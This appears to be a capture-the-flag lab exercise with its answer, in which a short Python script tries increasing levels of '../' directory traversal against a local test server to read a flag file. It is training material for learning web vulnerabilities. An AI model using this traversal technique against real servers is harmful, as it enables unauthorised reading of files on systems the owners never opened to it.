# 📂 Getting Access - L08 C03
Ok, now things are getting serious. We have agents aboard a probe and they've used a key to gain physical access to the mothership. Now inside, they've been able to connect to a page on the motherships main server which controls all the human technology they've been using. We think it's vulnerable to directory traversal, and we want to use that vulnerability to gain root access.

The page is at http://127.0.0.1:8082/humantechconfig?file=human.conf, write a script which will attempt various levels of directory traversal to give you access to the root directory.

**Tip:** Get to the root directory and the HTTP response will contain the flag.

> 💡 Hint: The directory traversal is in the form: 127.0.0.1:8082/humantechconfig?file=../human.conf

## Answer

```python
#
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout. If this occurs try narrowing
# down your search

import urllib.request

trav = '../'
file = 'human.conf'
website = 'http://127.0.0.1:8082/humantechconfig?file='

for i in range(1, 11):
  payload = trav * i + file
  payload = website + payload
  
  resp = urllib.request.urlopen(payload)
  print(resp.read())
```
